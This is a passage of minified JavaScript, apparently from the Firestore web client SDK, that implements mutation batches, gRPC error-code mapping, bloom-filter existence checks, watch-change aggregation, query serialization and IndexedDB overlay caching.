o=this.mutations[i];o.key.isEqual(e.key)&&WB(o,e,r[i])}}applyToLocalView(e,t){for(let r of this.baseMutations)r.key.isEqual(e.key)&&(t=gu(r,e,t,this.localWriteTime));for(let r of this.mutations)r.key.isEqual(e.key)&&(t=gu(r,e,t,this.localWriteTime));return t}applyToLocalDocumentSet(e,t){let r=JM();return this.mutations.forEach(i=>{let o=e.get(i.key),s=o.overlayedDocument,a=this.applyToLocalView(s,o.mutatedFields);a=t.has(i.key)?null:a;let c=ox(s,a);c!==null&&r.set(i.key,c),s.isValidDocument()||s.convertToNoDocument(ee.min())}),r}keys(){return this.mutations.reduce((e,t)=>e.add(t.key),ie())}isEqual(e){return this.batchId===e.batchId&&Xs(this.mutations,e.mutations,(t,r)=>LA(t,r))&&Xs(this.baseMutations,e.baseMutations,(t,r)=>LA(t,r))}},N_=class n{constructor(e,t,r,i){this.batch=e,this.commitVersion=t,this.mutationResults=r,this.docVersions=i}static from(e,t,r){Q(e.mutations.length===r.length);let i=function(){return BB}(),o=e.mutations;for(let s=0;s<o.length;s++)i=i.insert(o[s].key,r[s].version);return new n(e,t,r,i)}};var Tu=class{constructor(e,t){this.largestBatchId=e,this.mutation=t}getKey(){return this.mutation.key}isEqual(e){return e!==null&&this.mutation===e.mutation}toString(){return`Overlay{
      largestBatchId: ${this.largestBatchId},
      mutation: ${this.mutation.toString()}
    }`}};var P_=class{constructor(e,t){this.count=e,this.unchangedNames=t}};var it,ye;function ax(n){switch(n){default:return z();case N.CANCELLED:case N.UNKNOWN:case N.DEADLINE_EXCEEDED:case N.RESOURCE_EXHAUSTED:case N.INTERNAL:case N.UNAVAILABLE:case N.UNAUTHENTICATED:return!1;case N.INVALID_ARGUMENT:case N.NOT_FOUND:case N.ALREADY_EXISTS:case N.PERMISSION_DENIED:case N.FAILED_PRECONDITION:case N.ABORTED:case N.OUT_OF_RANGE:case N.UNIMPLEMENTED:case N.DATA_LOSS:return!0}}function cx(n){if(n===void 0)return Ze("GRPC error has no .code"),N.UNKNOWN;switch(n){case it.OK:return N.OK;case it.CANCELLED:return N.CANCELLED;case it.UNKNOWN:return N.UNKNOWN;case it.DEADLINE_EXCEEDED:return N.DEADLINE_EXCEEDED;case it.RESOURCE_EXHAUSTED:return N.RESOURCE_EXHAUSTED;case it.INTERNAL:return N.INTERNAL;case it.UNAVAILABLE:return N.UNAVAILABLE;case it.UNAUTHENTICATED:return N.UNAUTHENTICATED;case it.INVALID_ARGUMENT:return N.INVALID_ARGUMENT;case it.NOT_FOUND:return N.NOT_FOUND;case it.ALREADY_EXISTS:return N.ALREADY_EXISTS;case it.PERMISSION_DENIED:return N.PERMISSION_DENIED;case it.FAILED_PRECONDITION:return N.FAILED_PRECONDITION;case it.ABORTED:return N.ABORTED;case it.OUT_OF_RANGE:return N.OUT_OF_RANGE;case it.UNIMPLEMENTED:return N.UNIMPLEMENTED;case it.DATA_LOSS:return N.DATA_LOSS;default:return z()}}(ye=it||(it={}))[ye.OK=0]="OK",ye[ye.CANCELLED=1]="CANCELLED",ye[ye.UNKNOWN=2]="UNKNOWN",ye[ye.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",ye[ye.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",ye[ye.NOT_FOUND=5]="NOT_FOUND",ye[ye.ALREADY_EXISTS=6]="ALREADY_EXISTS",ye[ye.PERMISSION_DENIED=7]="PERMISSION_DENIED",ye[ye.UNAUTHENTICATED=16]="UNAUTHENTICATED",ye[ye.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",ye[ye.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",ye[ye.ABORTED=10]="ABORTED",ye[ye.OUT_OF_RANGE=11]="OUT_OF_RANGE",ye[ye.UNIMPLEMENTED=12]="UNIMPLEMENTED",ye[ye.INTERNAL=13]="INTERNAL",ye[ye.UNAVAILABLE=14]="UNAVAILABLE",ye[ye.DATA_LOSS=15]="DATA_LOSS";var BA=null;function ux(){return new TextEncoder}var QB=new di([4294967295,4294967295],0);function $A(n){let e=ux().encode(n),t=new Kv;return t.update(e),new Uint8Array(t.digest())}function HA(n){let e=new DataView(n.buffer),t=e.getUint32(0,!0),r=e.getUint32(4,!0),i=e.getUint32(8,!0),o=e.getUint32(12,!0);return[new di([t,r],0),new di([i,o],0)]}var k_=class n{constructor(e,t,r){if(this.bitmap=e,this.padding=t,this.hashCount=r,t<0||t>=8)throw new ho(`Invalid padding: ${t}`);if(r<0)throw new ho(`Invalid hash count: ${r}`);if(e.length>0&&this.hashCount===0)throw new ho(`Invalid hash count: ${r}`);if(e.length===0&&t!==0)throw new ho(`Invalid padding when bitmap length is 0: ${t}`);this.Ie=8*e.length-t,this.Te=di.fromNumber(this.Ie)}Ee(e,t,r){let i=e.add(t.multiply(di.fromNumber(r)));return i.compare(QB)===1&&(i=new di([i.getBits(0),i.getBits(1)],0)),i.modulo(this.Te).toNumber()}de(e){return(this.bitmap[Math.floor(e/8)]&1<<e%8)!=0}mightContain(e){if(this.Ie===0)return!1;let t=$A(e),[r,i]=HA(t);for(let o=0;o<this.hashCount;o++){let s=this.Ee(r,i,o);if(!this.de(s))return!1}return!0}static create(e,t,r){let i=e%8==0?0:8-e%8,o=new Uint8Array(Math.ceil(e/8)),s=new n(o,i,t);return r.forEach(a=>s.insert(a)),s}insert(e){if(this.Ie===0)return;let t=$A(e),[r,i]=HA(t);for(let o=0;o<this.hashCount;o++){let s=this.Ee(r,i,o);this.Ae(s)}}Ae(e){let t=Math.floor(e/8),r=e%8;this.bitmap[t]|=1<<r}},ho=class extends Error{constructor(){super(...arguments),this.name="BloomFilterError"}};var Su=class n{constructor(e,t,r,i,o){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=r,this.documentUpdates=i,this.resolvedLimboDocuments=o}static createSynthesizedRemoteEventForCurrentChange(e,t,r){let i=new Map;return i.set(e,Au.createSynthesizedTargetChangeForCurrentChange(e,t,r)),new n(ee.min(),i,new Fe(re),Wt(),ie())}},Au=class n{constructor(e,t,r,i,o){this.resumeToken=e,this.current=t,this.addedDocuments=r,this.modifiedDocuments=i,this.removedDocuments=o}static createSynthesizedTargetChangeForCurrentChange(e,t,r){return new n(r,t,ie(),ie(),ie())}};var Js=class{constructor(e,t,r,i){this.Re=e,this.removedTargetIds=t,this.key=r,this.Ve=i}},Mf=class{constructor(e,t){this.targetId=e,this.me=t}},xf=class{constructor(e,t,r=et.EMPTY_BYTE_STRING,i=null){this.state=e,this.targetIds=t,this.resumeToken=r,this.cause=i}},Rf=class{constructor(){this.fe=0,this.ge=zA(),this.pe=et.EMPTY_BYTE_STRING,this.ye=!1,this.we=!0}get current(){return this.ye}get resumeToken(){return this.pe}get Se(){return this.fe!==0}get be(){return this.we}De(e){e.approximateByteSize()>0&&(this.we=!0,this.pe=e)}ve(){let e=ie(),t=ie(),r=ie();return this.ge.forEach((i,o)=>{switch(o){case 0:e=e.add(i);break;case 2:t=t.add(i);break;case 1:r=r.add(i);break;default:z()}}),new Au(this.pe,this.ye,e,t,r)}Ce(){this.we=!1,this.ge=zA()}Fe(e,t){this.we=!0,this.ge=this.ge.insert(e,t)}Me(e){this.we=!0,this.ge=this.ge.remove(e)}xe(){this.fe+=1}Oe(){this.fe-=1,Q(this.fe>=0)}Ne(){this.we=!0,this.ye=!0}},O_=class{constructor(e){this.Le=e,this.Be=new Map,this.ke=Wt(),this.qe=qA(),this.Qe=new Fe(re)}Ke(e){for(let t of e.Re)e.Ve&&e.Ve.isFoundDocument()?this.$e(t,e.Ve):this.Ue(t,e.key,e.Ve);for(let t of e.removedTargetIds)this.Ue(t,e.key,e.Ve)}We(e){this.forEachTarget(e,t=>{let r=this.Ge(t);switch(e.state){case 0:this.ze(t)&&r.De(e.resumeToken);break;case 1:r.Oe(),r.Se||r.Ce(),r.De(e.resumeToken);break;case 2:r.Oe(),r.Se||this.removeTarget(t);break;case 3:this.ze(t)&&(r.Ne(),r.De(e.resumeToken));break;case 4:this.ze(t)&&(this.je(t),r.De(e.resumeToken));break;default:z()}})}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.Be.forEach((r,i)=>{this.ze(i)&&t(i)})}He(e){let t=e.targetId,r=e.me.count,i=this.Je(t);if(i){let o=i.target;if(Tf(o))if(r===0){let s=new q(o.path);this.Ue(t,s,at.newNoDocument(s,ee.min()))}else Q(r===1);else{let s=this.Ye(t);if(s!==r){let a=this.Ze(e),c=a?this.Xe(a,e,s):1;if(c!==0){this.je(t);let l=c===2?"TargetPurposeExistenceFilterMismatchBloom":"TargetPurposeExistenceFilterMismatch";this.Qe=this.Qe.insert(t,l)}BA?.et(function(h,p,m,y,D){var b,T,F,$,P,G;let Z={localCacheCount:h,existenceFilterCount:p.count,databaseId:m.database,projectId:m.projectId},K=p.unchangedNames;return K&&(Z.bloomFilter={applied:D===0,hashCount:(b=K?.hashCount)!==null&&b!==void 0?b:0,bitmapLength:($=(F=(T=K?.bits)===null||T===void 0?void 0:T.bitmap)===null||F===void 0?void 0:F.length)!==null&&$!==void 0?$:0,padding:(G=(P=K?.bits)===null||P===void 0?void 0:P.padding)!==null&&G!==void 0?G:0,mightContain:E=>{var v;return(v=y?.mightContain(E))!==null&&v!==void 0&&v}}),Z}(s,e.me,this.Le.tt(),a,c))}}}}Ze(e){let t=e.me.unchangedNames;if(!t||!t.bits)return null;let{bits:{bitmap:r="",padding:i=0},hashCount:o=0}=t,s,a;try{s=wi(r).toUint8Array()}catch(c){if(c instanceof Df)return Mn("Decoding the base64 bloom filter in existence filter failed ("+c.message+"); ignoring the bloom filter and falling back to full re-query."),null;throw c}try{a=new k_(s,i,o)}catch(c){return Mn(c instanceof ho?"BloomFilter error: ":"Applying bloom filter failed: ",c),null}return a.Ie===0?null:a}Xe(e,t,r){return t.me.count===r-this.nt(e,t.targetId)?0:2}nt(e,t){let r=this.Le.getRemoteKeysForTarget(t),i=0;return r.forEach(o=>{let s=this.Le.tt(),a=`projects/${s.projectId}/databases/${s.database}/documents/${o.path.canonicalString()}`;e.mightContain(a)||(this.Ue(t,o,null),i++)}),i}rt(e){let t=new Map;this.Be.forEach((o,s)=>{let a=this.Je(s);if(a){if(o.current&&Tf(a.target)){let c=new q(a.target.path);this.ke.get(c)!==null||this.it(s,c)||this.Ue(s,c,at.newNoDocument(c,e))}o.be&&(t.set(s,o.ve()),o.Ce())}});let r=ie();this.qe.forEach((o,s)=>{let a=!0;s.forEachWhile(c=>{let l=this.Je(c);return!l||l.purpose==="TargetPurposeLimboResolution"||(a=!1,!1)}),a&&(r=r.add(o))}),this.ke.forEach((o,s)=>s.setReadTime(e));let i=new Su(e,t,this.Qe,this.ke,r);return this.ke=Wt(),this.qe=qA(),this.Qe=new Fe(re),i}$e(e,t){if(!this.ze(e))return;let r=this.it(e,t.key)?2:0;this.Ge(e).Fe(t.key,r),this.ke=this.ke.insert(t.key,t),this.qe=this.qe.insert(t.key,this.st(t.key).add(e))}Ue(e,t,r){if(!this.ze(e))return;let i=this.Ge(e);this.it(e,t)?i.Fe(t,1):i.Me(t),this.qe=this.qe.insert(t,this.st(t).delete(e)),r&&(this.ke=this.ke.insert(t,r))}removeTarget(e){this.Be.delete(e)}Ye(e){let t=this.Ge(e).ve();return this.Le.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}xe(e){this.Ge(e).xe()}Ge(e){let t=this.Be.get(e);return t||(t=new Rf,this.Be.set(e,t)),t}st(e){let t=this.qe.get(e);return t||(t=new Re(re),this.qe=this.qe.insert(e,t)),t}ze(e){let t=this.Je(e)!==null;return t||O("WatchChangeAggregator","Detected inactive target",e),t}Je(e){let t=this.Be.get(e);return t&&t.Se?null:this.Le.ot(e)}je(e){this.Be.set(e,new Rf),this.Le.getRemoteKeysForTarget(e).forEach(t=>{this.Ue(e,t,null)})}it(e,t){return this.Le.getRemoteKeysForTarget(e).has(t)}};function qA(){return new Fe(q.comparator)}function zA(){return new Fe(q.comparator)}var YB={asc:"ASCENDING",desc:"DESCENDING"},ZB={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},JB={and:"AND",or:"OR"},F_=class{constructor(e,t){this.databaseId=e,this.useProto3Json=t}};function V_(n,e){return n.useProto3Json||Uu(e)?e:{value:e}}function oa(n,e){return n.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function lx(n,e){return n.useProto3Json?e.toBase64():e.toUint8Array()}function XB(n,e){return oa(n,e.toTimestamp())}function Xe(n){return Q(!!n),ee.fromTimestamp(function(t){let r=Ar(t);return new $e(r.seconds,r.nanos)}(n))}function fE(n,e){return L_(n,e).canonicalString()}function L_(n,e){let t=function(i){return new ve(["projects",i.projectId,"databases",i.database])}(n).child("documents");return e===void 0?t:t.child(e)}function dx(n){let e=ve.fromString(n);return Q(Ex(e)),e}function Mu(n,e){return fE(n.databaseId,e.path)}function Wn(n,e){let t=dx(e);if(t.get(1)!==n.databaseId.projectId)throw new k(N.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+t.get(1)+" vs "+n.databaseId.projectId);if(t.get(3)!==n.databaseId.database)throw new k(N.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+t.get(3)+" vs "+n.databaseId.database);return new q(px(t))}function hx(n,e){return fE(n.databaseId,e)}function fx(n){let e=dx(n);return e.length===4?ve.emptyPath():px(e)}function U_(n){return new ve(["projects",n.databaseId.projectId,"databases",n.databaseId.database]).canonicalString()}function px(n){return Q(n.length>4&&n.get(4)==="documents"),n.popFirst(5)}function GA(n,e,t){return{name:Mu(n,e),fields:t.value.mapValue.fields}}function gx(n,e,t){let r=Wn(n,e.name),i=Xe(e.updateTime),o=e.createTime?Xe(e.createTime):ee.min(),s=new St({mapValue:{fields:e.fields}}),a=at.newFoundDocument(r,i,o,s);return t&&a.setHasCommittedMutations(),t?a.setHasCommittedMutations():a}function e$(n,e){return"found"in e?function(r,i){Q(!!i.found),i.found.name,i.found.updateTime;let o=Wn(r,i.found.name),s=Xe(i.found.updateTime),a=i.found.createTime?Xe(i.found.createTime):ee.min(),c=new St({mapValue:{fields:i.found.fields}});return at.newFoundDocument(o,s,a,c)}(n,e):"missing"in e?function(r,i){Q(!!i.missing),Q(!!i.readTime);let o=Wn(r,i.missing),s=Xe(i.readTime);return at.newNoDocument(o,s)}(n,e):z()}function t$(n,e){let t;if("targetChange"in e){e.targetChange;let r=function(l){return l==="NO_CHANGE"?0:l==="ADD"?1:l==="REMOVE"?2:l==="CURRENT"?3:l==="RESET"?4:z()}(e.targetChange.targetChangeType||"NO_CHANGE"),i=e.targetChange.targetIds||[],o=function(l,h){return l.useProto3Json?(Q(h===void 0||typeof h=="string"),et.fromBase64String(h||"")):(Q(h===void 0||h instanceof Buffer||h instanceof Uint8Array),et.fromUint8Array(h||new Uint8Array))}(n,e.targetChange.resumeToken),s=e.targetChange.cause,a=s&&function(l){let h=l.code===void 0?N.UNKNOWN:cx(l.code);return new k(h,l.message||"")}(s);t=new xf(r,i,o,a||null)}else if("documentChange"in e){e.documentChange;let r=e.documentChange;r.document,r.document.name,r.document.updateTime;let i=Wn(n,r.document.name),o=Xe(r.document.updateTime),s=r.document.createTime?Xe(r.document.createTime):ee.min(),a=new St({mapValue:{fields:r.document.fields}}),c=at.newFoundDocument(i,o,s,a),l=r.targetIds||[],h=r.removedTargetIds||[];t=new Js(l,h,c.key,c)}else if("documentDelete"in e){e.documentDelete;let r=e.documentDelete;r.document;let i=Wn(n,r.document),o=r.readTime?Xe(r.readTime):ee.min(),s=at.newNoDocument(i,o),a=r.removedTargetIds||[];t=new Js([],a,s.key,s)}else if("documentRemove"in e){e.documentRemove;let r=e.documentRemove;r.document;let i=Wn(n,r.document),o=r.removedTargetIds||[];t=new Js([],o,i,null)}else{if(!("filter"in e))return z();{e.filter;let r=e.filter;r.targetId;let{count:i=0,unchangedNames:o}=r,s=new P_(i,o),a=r.targetId;t=new Mf(a,s)}}return t}function xu(n,e){let t;if(e instanceof bi)t={update:GA(n,e.key,e.value)};else if(e instanceof Ti)t={delete:Mu(n,e.key)};else if(e instanceof Rn)t={update:GA(n,e.key,e.data),updateMask:a$(e.fieldMask)};else{if(!(e instanceof Cu))return z();t={verify:Mu(n,e.key)}}return e.fieldTransforms.length>0&&(t.updateTransforms=e.fieldTransforms.map(r=>function(o,s){let a=s.transform;if(a instanceof Di)return{fieldPath:s.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(a instanceof Mr)return{fieldPath:s.field.canonicalString(),appendMissingElements:{values:a.elements}};if(a instanceof xr)return{fieldPath:s.field.canonicalString(),removeAllFromArray:{values:a.elements}};if(a instanceof Ci)return{fieldPath:s.field.canonicalString(),increment:a.Pe};throw z()}(0,r))),e.precondition.isNone||(t.currentDocument=function(i,o){return o.updateTime!==void 0?{updateTime:XB(i,o.updateTime)}:o.exists!==void 0?{exists:o.exists}:z()}(n,e.precondition)),t}function j_(n,e){let t=e.currentDocument?function(o){return o.updateTime!==void 0?We.updateTime(Xe(o.updateTime)):o.exists!==void 0?We.exists(o.exists):We.none()}(e.currentDocument):We.none(),r=e.updateTransforms?e.updateTransforms.map(i=>function(s,a){let c=null;if("setToServerValue"in a)Q(a.setToServerValue==="REQUEST_TIME"),c=new Di;else if("appendMissingElements"in a){let h=a.appendMissingElements.values||[];c=new Mr(h)}else if("removeAllFromArray"in a){let h=a.removeAllFromArray.values||[];c=new xr(h)}else"increment"in a?c=new Ci(s,a.increment):z();let l=Je.fromServerFormat(a.fieldPath);return new vo(l,c)}(n,i)):[];if(e.update){e.update.name;let i=Wn(n,e.update.name),o=new St({mapValue:{fields:e.update.fields}});if(e.updateMask){let s=function(c){let l=c.fieldPaths||[];return new on(l.map(h=>Je.fromServerFormat(h)))}(e.updateMask);return new Rn(i,o,s,t,r)}return new bi(i,o,t,r)}if(e.delete){let i=Wn(n,e.delete);return new Ti(i,t)}if(e.verify){let i=Wn(n,e.verify);return new Cu(i,t)}return z()}function n$(n,e){return n&&n.length>0?(Q(e!==void 0),n.map(t=>function(i,o){let s=i.updateTime?Xe(i.updateTime):Xe(o);return s.isEqual(ee.min())&&(s=Xe(o)),new R_(s,i.transformResults||[])}(t,e))):[]}function mx(n,e){return{documents:[hx(n,e.path)]}}function yx(n,e){let t={structuredQuery:{}},r=e.path,i;e.collectionGroup!==null?(i=r,t.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(i=r.popLast(),t.structuredQuery.from=[{collectionId:r.lastSegment()}]),t.parent=hx(n,i);let o=function(l){if(l.length!==0)return wx(Se.create(l,"and"))}(e.filters);o&&(t.structuredQuery.where=o);let s=function(l){if(l.length!==0)return l.map(h=>function(m){return{field:Gs(m.field),direction:i$(m.dir)}}(h))}(e.orderBy);s&&(t.structuredQuery.orderBy=s);let a=V_(n,e.limit);return a!==null&&(t.structuredQuery.limit=a),e.startAt&&(t.structuredQuery.startAt=function(l){return{before:l.inclusive,values:l.position}}(e.startAt)),e.endAt&&(t.structuredQuery.endAt=function(l){return{before:!l.inclusive,values:l.position}}(e.endAt)),{_t:t,parent:i}}function vx(n){let e=fx(n.parent),t=n.structuredQuery,r=t.from?t.from.length:0,i=null;if(r>0){Q(r===1);let h=t.from[0];h.allDescendants?i=h.collectionId:e=e.child(h.collectionId)}let o=[];t.where&&(o=function(p){let m=_x(p);return m instanceof Se&&uE(m)?m.getFilters():[m]}(t.where));let s=[];t.orderBy&&(s=function(p){return p.map(m=>function(D){return new mo(Ws(D.field),function(T){switch(T){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(D.direction))}(m))}(t.orderBy));let a=null;t.limit&&(a=function(p){let m;return m=typeof p=="object"?p.value:p,Uu(m)?null:m}(t.limit));let c=null;t.startAt&&(c=function(p){let m=!!p.before,y=p.values||[];return new Yn(y,m)}(t.startAt));let l=null;return t.endAt&&(l=function(p){let m=!p.before,y=p.values||[];return new Yn(y,m)}(t.endAt)),GM(e,i,s,o,a,"F",c,l)}function r$(n,e){let t=function(i){switch(i){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return z()}}(e.purpose);return t==null?null:{"goog-listen-tags":t}}function _x(n){return n.unaryFilter!==void 0?function(t){switch(t.unaryFilter.op){case"IS_NAN":let r=Ws(t.unaryFilter.field);return ge.create(r,"==",{doubleValue:NaN});case"IS_NULL":let i=Ws(t.unaryFilter.field);return ge.create(i,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":let o=Ws(t.unaryFilter.field);return ge.create(o,"!=",{doubleValue:NaN});case"IS_NOT_NULL":let s=Ws(t.unaryFilter.field);return ge.create(s,"!=",{nullValue:"NULL_VALUE"});default:return z()}}(n):n.fieldFilter!==void 0?function(t){return ge.create(Ws(t.fieldFilter.field),function(i){switch(i){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return z()}}(t.fieldFilter.op),t.fieldFilter.value)}(n):n.compositeFilter!==void 0?function(t){return Se.create(t.compositeFilter.filters.map(r=>_x(r)),function(i){switch(i){case"AND":return"and";case"OR":return"or";default:return z()}}(t.compositeFilter.op))}(n):z()}function i$(n){return YB[n]}function o$(n){return ZB[n]}function s$(n){return JB[n]}function Gs(n){return{fieldPath:n.canonicalString()}}function Ws(n){return Je.fromServerFormat(n.fieldPath)}function wx(n){return n instanceof ge?function(t){if(t.op==="=="){if(MA(t.value))return{unaryFilter:{field:Gs(t.field),op:"IS_NAN"}};if(AA(t.value))return{unaryFilter:{field:Gs(t.field),op:"IS_NULL"}}}else if(t.op==="!="){if(MA(t.value))return{unaryFilter:{field:Gs(t.field),op:"IS_NOT_NAN"}};if(AA(t.value))return{unaryFilter:{field:Gs(t.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Gs(t.field),op:o$(t.op),value:t.value}}}(n):n instanceof Se?function(t){let r=t.getFilters().map(i=>wx(i));return r.length===1?r[0]:{compositeFilter:{op:s$(t.op),filters:r}}}(n):z()}function a$(n){let e=[];return n.fields.forEach(t=>e.push(t.canonicalString())),{fieldPaths:e}}function Ex(n){return n.length>=4&&n.get(0)==="projects"&&n.get(2)==="databases"}var sa=class n{constructor(e,t,r,i,o=ee.min(),s=ee.min(),a=et.EMPTY_BYTE_STRING,c=null){this.target=e,this.targetId=t,this.purpose=r,this.sequenceNumber=i,this.snapshotVersion=o,this.lastLimboFreeSnapshotVersion=s,this.resumeToken=a,this.expectedCount=c}withSequenceNumber(e){return new n(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new n(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new n(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new n(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}};var Nf=class{constructor(e){this.ct=e}};function c$(n,e){let t;if(e.document)t=gx(n.ct,e.document,!!e.hasCommittedMutations);else if(e.noDocument){let r=q.fromSegments(e.noDocument.path),i=wo(e.noDocument.readTime);t=at.newNoDocument(r,i),e.hasCommittedMutations&&t.setHasCommittedMutations()}else{if(!e.unknownDocument)return z();{let r=q.fromSegments(e.unknownDocument.path),i=wo(e.unknownDocument.version);t=at.newUnknownDocument(r,i)}}return e.readTime&&t.setReadTime(function(i){let o=new $e(i[0],i[1]);return ee.fromTimestamp(o)}(e.readTime)),t}function WA(n,e){let t=e.key,r={prefixPath:t.getCollectionPath().popLast().toArray(),collectionGroup:t.collectionGroup,documentId:t.path.lastSegment(),readTime:Pf(e.readTime),hasCommittedMutations:e.hasCommittedMutations};if(e.isFoundDocument())r.document=function(o,s){return{name:Mu(o,s.key),fields:s.data.value.mapValue.fields,updateTime:oa(o,s.version.toTimestamp()),createTime:oa(o,s.createTime.toTimestamp())}}(n.ct,e);else if(e.isNoDocument())r.noDocument={path:t.path.toArray(),readTime:_o(e.version)};else{if(!e.isUnknownDocument())return z();r.unknownDocument={path:t.path.toArray(),version:_o(e.version)}}return r}function Pf(n){let e=n.toTimestamp();return[e.seconds,e.nanoseconds]}function _o(n){let e=n.toTimestamp();return{seconds:e.seconds,nanoseconds:e.nanoseconds}}function wo(n){let e=new $e(n.seconds,n.nanoseconds);return ee.fromTimestamp(e)}function co(n,e){let t=(e.baseMutations||[]).map(o=>j_(n.ct,o));for(let o=0;o<e.mutations.length-1;++o){let s=e.mutations[o];if(o+1<e.mutations.length&&e.mutations[o+1].transform!==void 0){let a=e.mutations[o+1];s.updateTransforms=a.transform.fieldTransforms,e.mutations.splice(o+1,1),++o}}let r=e.mutations.map(o=>j_(n.ct,o)),i=$e.fromMillis(e.localWriteTimeMs);return new bu(e.batchId,i,t,r)}function hu(n){let e=wo(n.readTime),t=n.lastLimboFreeSnapshotVersion!==void 0?wo(n.lastLimboFreeSnapshotVersion):ee.min(),r;return r=function(o){return o.documents!==void 0}(n.query)?function(o){return Q(o.documents.length===1),Lt(ya(fx(o.documents[0])))}(n.query):function(o){return Lt(vx(o))}(n.query),new sa(r,n.targetId,"TargetPurposeListen",n.lastListenSequenceNumber,e,t,et.fromBase64String(n.resumeToken))}function Ix(n,e){let t=_o(e.snapshotVersion),r=_o(e.lastLimboFreeSnapshotVersion),i;i=Tf(e.target)?mx(n.ct,e.target):yx(n.ct,e.target)._t;let o=e.resumeToken.toBase64();return{targetId:e.targetId,canonicalId:yo(e.target),readTime:t,resumeToken:o,lastListenSequenceNumber:e.sequenceNumber,lastLimboFreeSnapshotVersion:r,query:i}}function pE(n){let e=vx({parent:n.parent,structuredQuery:n.structuredQuery});return n.limitType==="LAST"?Af(e,e.limit,"L"):e}function e_(n,e){return new Tu(e.largestBatchId,j_(n.ct,e.overlayMutation))}function KA(n,e){let t=e.path.lastSegment();return[n,Vt(e.path.popLast()),t]}function QA(n,e,t,r){return{indexId:n,uid:e,sequenceNumber:t,readTime:_o(r.readTime),documentKey:Vt(r.documentKey.path),largestBatchId:r.largestBatchId}}var B_=class{getBundleMetadata(e,t){return YA(e).get(t).next(r=>{if(r)return function(o){return{id:o.bundleId,createTime:wo(o.createTime),version:o.version}}(r)})}saveBundleMetadata(e,t){return YA(e).put(function(i){return{bundleId:i.id,createTime:_o(Xe(i.createTime)),version:i.version}}(t))}getNamedQuery(e,t){return ZA(e).get(t).next(r=>{if(r)return function(o){return{name:o.name,query:pE(o.bundledQuery),readTime:wo(o.readTime)}}(r)})}saveNamedQuery(e,t){return ZA(e).put(function(i){return{name:i.name,readTime:_o(Xe(i.readTime)),bundledQuery:i.bundledQuery}}(t))}};function YA(n){return dt(n,"bundles")}function ZA(n){return dt(n,"namedQueries")}var kf=class n{constructor(e,t){this.serializer=e,this.userId=t}static lt(e,t){let r=t.uid||"";return new n(e,r)}getOverlay(e,t){return au(e).get(KA(this.userId,t)).next(r=>r?e_(this.serializer,r):null)}getOverlays(e,t){let r=zn();return M.forEach(t,i=>this.getOverlay(e,i).next(o=>{o!==null&&r.set(i,o)})).next(()=>r)}saveOverlays(e,t,r){let i=[];return r.forEach((o,s)=>{let a=new Tu(t,s);i.push(this.ht(e,a))}),M.waitFor(i)}removeOverlaysForBatchId(e,t,r){let i=new Set;t.forEach(s=>i.add(Vt(s.getCollectionPath())));let o=[];return i.forEach(s=>{let a=IDBKeyRange.bound([this.userId,s,r],[this.userId,s,r+1],!1,!0);o.push(au(e).j("collectionPathOverlayIndex",a))}),M.waitFor(o)}getOverlaysForCollection(e,t,r){let i=zn(),o=Vt(t),s=IDBKeyRange.bound([this.userId,o,r],[this.userId,o,Number.POSITIVE_INFINITY],!0);return au(e).U("collectionPathOverlayIndex",s).next(a=>{for(let c of a){let l=e_(this.serializer,c);i.set(l.getKey(),l)}return i})}getOverlaysForCollectionGroup(e,t,r,i){let o=zn(),s,a=IDBKeyRange.bound([this.userId,t,r],[this.userId,t,Number.POSITIVE_INFINITY],!0);return au(e).J({index:"collectionGroupOverlayIndex",range:a},(c,l,h)=>{let p=e_(this.serializer,l);o.size()<i||p.largestBatchId===s?(o.set(p.getKey(),p),s=p.largestBatchId):h.done()}).next(()=>o)}ht(e,t){return au(e).put(function(i,o,s){let[a,c,l]=KA(o,s.mutation.key);return{userId:o,collectionPath:c,documentId:l,collectionGroup:s.mutation.key.getCollectionGroup(),largestBatchId:s.largestBatchId,overlayMutation:xu(i.ct,s.mutation)}}(this.serializer,this.userId,t))}};function au(n){return dt(n,"documentOverlays")}var $_=class{Pt(e){return dt(e,"globals")}getSessionToken(e){return this.Pt(e).get("sessionToken").next(t=>{let r=t?.value;return r?et.fromUint8Array(r):et.EMPTY_BYTE_STRING})}setSessionToken(e,t){return 